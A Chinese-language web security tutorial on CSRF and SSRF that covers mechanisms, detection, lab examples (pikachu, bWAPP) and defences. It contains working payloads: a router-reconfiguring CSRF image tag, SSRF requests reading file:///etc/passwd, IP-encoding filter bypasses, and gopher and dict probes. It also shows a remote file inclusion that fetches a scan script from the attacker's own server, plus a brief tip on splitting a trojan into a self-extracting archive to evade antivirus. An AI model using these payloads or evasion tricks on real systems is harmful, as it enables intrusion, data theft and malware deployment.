csrf——
CSRF(Cross-Site Request Forgery,跨站点伪造请求)是一种网络攻击方式
该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点
从而在未授权的情况下执行在权限保护之下的操作,具有很大的危害性。
当我们打开登陆某个网站后,就会产生一个会话,这个会话可能是SESSION、Cookie,重点是浏览器与服务器之间是在会话之中
在这个会话没有结束时候,可以利用访问者的权限对网站进行操作,如进行发表文章、发邮件、删除文章等操作。
当这个会话结束后,在进行某些操作时候Web应用程序通常会来提醒会话已过期,或者是请重新登陆等提示。
而CSRF攻击则是建立会话之上的攻击。比如当访问者登陆了网上银行,正在进行转账业务,这时你的某个QQ好友(攻击者)发来一条消息(URL)
这条消息是攻击者精心构造的转账业务代码。而且与所登录的网站是同一个银行,访问者可能认为这个网站是安全的,并不是什么钓鱼网站
然后打开了这条URL,接着就会触发攻击执行恶意的操作
攻击成功主要是因为你的浏览器正处于与此网站的会话之中,那么一切正常操作都是合法的,而入侵者构造的这段代码只不过是正常的转账操作代码
案例
比如说访问者想给用户spisec转账1000元,那么点击提交按钮之后,可能会发送以下请求:
http://www.taobao.com/pay.jsp?user=spisec&money=1000
而攻击者仅仅是改变一下user参数与money参数即可完成一次“合法”的攻击,如:
http://www.taobao.com/pay.jsp?user=hack&money=10000
当访问了这条URL之后,就会自动向hack这个账户里面转入10000元。而这是访问者亲手造成的,并没有人破解密码或入侵Web服务器
可使用nc -lvnp 端口来监听

流程——
用户C打开浏览器,访问受信任网站A,输入用户名和密码请求登录网站A
在用户信息通过验证后,网站A产生Cookie信息并返回给浏览器
此时用户登录网站A成功,可以正常发送请求到网站A
用户未退出网站A之前,在同一浏览器中,打开一个TAB页访问网站B
可能是点击的邮件、qq会话中的链接地址
网站B接收到用户请求后,返回一些攻击性代码
攻击代码中要求用户浏览器去访问站点A
浏览器在接收到这些网站B的返回数据后,根据网站B的请求,访问站点A
浏览器在用户不知情的情况下携带Cookie信息,向网站 A 发出请求。
网站A并不知道该请求其实是由B发起的,所以会根据用户C的Cookie信息和权限处理该请求
导致来自网站B的恶意代码被执行。
两个侧重点
CSRF的攻击建立在浏览器与Web服务器的会话之中。
或者是有用户信息,用户登录不用密码
欺骗用户访问URL
也就是说攻击者盗用了用户的身份,用用户合法手段进行自己的操作

CSRF攻击分类和检测——
CSRF漏洞一般分为站外和站内两种类型
CSRF 站外类型
本质上就是传统意义上的外部提交数据问题。
通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题,
但是有时为了提高用户的体验性,可能没有对一些操作做任何限制,所以攻击者可以事先预测并设置请求的参数,
在站外的Web页面里编写脚本伪造文件请求,或者和自动提交的表单一起使用来实现GET、POST请求
当用户在会话状态下点击链接访问站外Web页面,客户端就被强迫发起请求。
SPAM可以简单的理解为垃圾留言、垃圾评论,或者是带有站外链接的恶意回复
CSRF 站内类型
在一定程度上是由于程序员滥用$_REQUEST类变量造成的。
在一些敏感的操作中,本来要求用户从表单提交发起POST请求传递参数给程序,
但是由于使用了$_REQUEST等变量,程序也支持接收GET请求传递的参数,这就为攻击者使用CSRF创造条件。
一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里,受害者浏览了这样的页面就会被强迫发起这些请求。

CSRF漏洞检测——
检测CSRF漏洞是一项比较繁琐的工作,以下是一个最简单的流程:
抓取一个正常请求的数据包
观察数据包里是否存在用户信息或者token相关的字段
如果有那么删除一下看看数据包是否正常,看看响应包是否正常,如果不正常则尝试放弃(绕过几率极小)
然后删除origin字段重新提交
看看响应包是否正常,如果不正常则尝试放弃(绕过几率极小)
最后去掉Referer字段后再重新提交
看看响应包是否正常,如果不正常那也可以尝试绕过
如果以上都正常,则生成POC,另一个浏览器登录验证。
CSRF漏洞容易出现的地方
修改密码的地方
添加用户的地方
数据库备份的地方数据交易、支付等
等其它一些对话框钓鱼页面
CSRF一般与XSS结合使用

CSRF攻击案例——
本地网络设备CSRF攻击
一般情况下,外网不可以访问交换机等内网硬件,这提高了安全性,也让工作人员变得疏忽,因此内网设备很多是默认密码
首先,模拟正常用户身份登录->开启web管理端口的操作,用burp抓包后,抓取得到地址为
<img src=http://192.168.1.1/userRpm/ManageControlRpm.htm?port=80&ip=255.255.255.255&Save=%B1%A3+%B4%E6>
将这个攻击代码插入到想插入的地方,欺骗对方企业访问这个地址,访问之后对方设备的远程web管理端口就打开了
这段攻击代码三个功能,先开启80端口,把远程web管理IP地址改成255.255.255.255,保存
CSRF自解压案例
将攻击代码嵌入到rar压缩软件的自解压选项中，用户点击这个压缩软件后，自动解压过程中，就触发了恶意代码
补充:
在做免杀的时候也可以使用这个功能做自解压木马干掉杀毒软件
可以把一个木马进行拆分
先把注册表导入形式拆分
内存部分再拆分
启动项拆分导入形式
最后加一个自动.exe形式
burp添加管理员账号
网站开源情况下,找到添加管理员账号的代码,模拟出添加管理员的数据包,再进行修改,只需要把地址改成要攻击网站,嵌入到恶意程序,诱骗管理员在管理状态中触发
小结
CSRF的攻击门槛不高,但是这种攻击一定是基于会话,也就是需要遇害者在登录状态下执行恶意代码,这也就要求将CSRF与其他攻击手法相结合,构造攻击代码+钓鱼执行代码

CSRF漏洞防御——
referer
使用严格的Referer验证策略来防御登陆CSRF,因为登陆的表单一般都是通过HTTPS发送,在合法请求里面的Referer都是真实可靠的。
通过referer判断页面来源进行CSRF防护,该方式无法防止站内CSRF攻击及referer字段伪造。
token
通过token方式进行CSRF防护,在服务器端对比POST提交参数的token与Session中绑定的token是否一致。
origin
对于更长远的建议,能用Origin字段来替代Referer,因为这样既保留了既有效果,又尊重了用户的隐私。
最终要废除利用token来防御CSRF的方式,因为这样网站就可以更好的保护无论是HTTP还是HTTPS请求,而不用担心token是否会泄露。
验证码
重要功能点使用动态验证码进行CSRF防护
原密码
对于修改密码操作,推荐附加上原密码的验证
白名单
对于那些有特定跨站需求的请求,网站应该建立一份白名单,比如主页等。
校验请求
严格区分好POST与GET的数据请求

ssrf——
SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成,由服务端发起请求的一个安全漏洞。
很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL,Web应用可以获取url中的图片,下文件,读文件等。
攻击者可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。一般SSRF攻击的目标是从外网无法访问的内部系统。
成因、用途、点位
SSRF形成原因:
SSRF漏洞形成的原因大多是因为服务端提供了从其他[服务器/应用]获取数据的功能,且没有对目标地址作过滤和限制。
比如从指定URL地址获取网页文本内容,加载指定地址的图片,文档等等。
比如:
A网站是所有人都可以访问的外网网站,B网站是一个他们内部的网站,普通用户只可以访问a网站,不能访问b网站。
但是可以通过a网站做中间人,访问b网站,从而达到攻击b网站需求,所以一般攻击是选择一台可以由外部用户访问的存在漏洞的外网服务器作为跳板机
正常用户访问网站的流程是
输入A网站URL-->发送请求-->A服务器接受请求(没有过滤)并处理-->返回用户响应
产生的原因:服务器端的验证并没有对其请求获取图片的参数(image=)做出严格的过滤以及限制,导致A网站可以从其他服务器的获取数据

SSRF的用途——
攻击者利用ssrf可以实现的攻击主要有5种
可以对外网、服务器所在内网、本地进行端口扫描,获取一些服务的banner信息
攻击运行在内网或本地的应用程序,比如溢出
对内网web应用进行指纹识别,通过访问默认文件实现
攻击内外网的web应用,主要是使用get参数就可以实现的攻击(比如struts2、sqli等)
利用file协议读取本地文件等
SSRF漏洞出没位置
所有调外部资源的参数都有可能存在ssrf漏洞
分享:通过URL地址分享网页内容
转码服务
在线翻译
图片加载与下载:通过URL地址加载或下载图片
图片、文章收藏功能
未公开的api实现以及其他调用URL的功能
从URL关键字中寻找,share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain等
例如:www.xxx.com/xxx.php?image=www.lucity.com/1.jpg
如果将www.lucity.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么
在存在漏洞的情况下,如果存在该内网地址就会返回1xx、2xx之类的状态码,不存在就会其他的状态码

SSRF绕过与防护——
SSRF常用的后端实现
ssrf攻击可能存在任何语言编写的应用,代码审计中要注意以下函数
file_get_contents
从用户指定的url获取图片,然后把它用一个随机文件名保存在硬盘上,并展示给用户
fsockopen()
实现获取用户指定url的数据(文件或者html)。这个函数会使用socket跟服务器建立tcp连接,传输原始数据
curl_exec()
用来获取数据
绕过手法
更改IP地址写法
一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP,如采用如下正则表达式:
^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$
^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
对于这种过滤可以采用改编IP的写法的方式进行绕过,例如192.168.0.1这个IP地址
我们可以改写成:
(1)、8进制格式:0300.0250.0.1
(2)、16进制格式:0xC0.0xA8.0.1
(3)、10进制整数格式:3232235521
(4)、16进制整数格式:0xC0A80001
利用解析URL所出现的问题
在某些情况下,后端程序可能会对访问的URL进行解析,对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当,导致可以绕过过滤。
随意地址+攻击地址:http://www.baidu.com@192.168.0.1/
当后端程序通过不正确的正则表达式(比如将http之后到com为止的字符内容,也就是www.baidu.com,认为是访问请求的host地址时)对上述URL的内容进行解析的时候
很有可能会认为访问URL的host为www.baidu.com,而实际上这个URL所请求的内容是192.168.0.1上的内容。

SSRF防护方法——
1、防护措施
（黑名单）
（1）过滤10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址
（2）过滤file:///、dict://、gopher://、ftp://危险schema
（3）对返回的内容进行识别
（4）内网服务开启鉴权(Memcached,Redis,Elasticsearch and MongoDB)
2、最佳防护
使用地址白名单
对返回内容进行识别
需要使用互联网资源(比如贴吧使用网络图片)而无法使用白名单的情况:
首先禁用CURLOPT_FOLLOWLOCATION;
然后通过域名获取目标ip,并过滤内部ip;
最后识别返回的内容是否与假定内容一致

SSRF案例——
案例一：url没过滤
# 源代码如下
if(isset($_GET['url']) && $_GET['url'] != null){
    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH) ;
//ssrf的问题是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
//除了http/https外,curl还支持一些其他的协议curl --version可以查看其支持的协议
//curl支持很多协议,有FTP,FTPS,HTTP,HTTPS,GOPHER,TELNET,DICT,FILE以及LDAP
    echo $RES;
}
此时可以在url后边接任意地址
#原地址:
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=http://localhost/1.txt
#直接替换url为任意网址或本地文件路径
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
案例二:只读取PHP文件
file_get_contents函数只能读取PHP文件,所以可以修改原本的路径,读取服务器其他的php文件
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/captain.php
案例三:文件包含
利用文件包含漏洞,加载远程脚本扫描内部服务
#GET的请求:
http://192.168.163.157/bWAPP/rlfi.php?language=lang_en.php&action=go
#观察Get请求中的参数,发现是典型文件包含问题,language=lang_en.php
#使用如下PAYLOAD,远程包含并执行扫描脚本探测内网主机的端口和服务。
#POST请求
http://192.168.163.157/bWAPP/rlfi.php?language=http://xxx.xxx.xxx/bWAPP/ssrf-1.txt&action=go
#POST DATA内容：
ip=192.168.60.70
192.168.163.157是要访问的主机地址A
xxx.xxx.xxx是要使用的远程扫描脚本的地址(也就是自己搭建的服务器)
192.168.60.70是要扫描的目标主机内网地址B,且该地址是xxx.xxx.xxx主机无法访问到的
使用post请求提交要进行扫描的目标主机IP,扫描结束后便返回结果。

SSRF利用其他协议——
file协议的运用
请求http://192.168.163.150/test.php?url=file:///etc/passwd可以获取敏感文件的信息
gopher协议的运用
gopher协议是比http协议更早出现的协议,现已不常用,但是在SSRF漏洞利用中gopher可以说是万金油,因为可以使用gopher发送各种格式的请求包
这样可以解决漏洞点不在GET参数的问题
基本协议格式:
URL:gopher://<host>:<port>/<gopher-path>
进行如下请求可以发送一个POST请求,且参数cmd的值为balabal
构造gopher请求的时候,回车换行符号要进行2次url编码为%250d%250a
http://192.168.0.100/ssrf1.php?url=gopher://192.168.0.105:8080/_POST /test.php HTTP/1.1%0d%0aHost: 192.168.0.105:8080%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0aid=1
gopher在SSRF漏洞利用中具体的攻击方式可以参考如下链接:
https://blog.chaitin.cn/gopher-attack-surfaces/
dict协议应用
dict协议是一个字典服务器协议,通常用于让客户端使用过程中能够访问更多的字典源，
但是在SSRF中如果可以使用dict协议,那么就可以轻易的获取目标服务器端口上运行的服务版本等信息
如请求http://192.168.163.150/test.php?url=dict://192.168.163.1:3306/info
可以获取目标主机的3306端口上运行着mysq-l5.5.55版本的应用。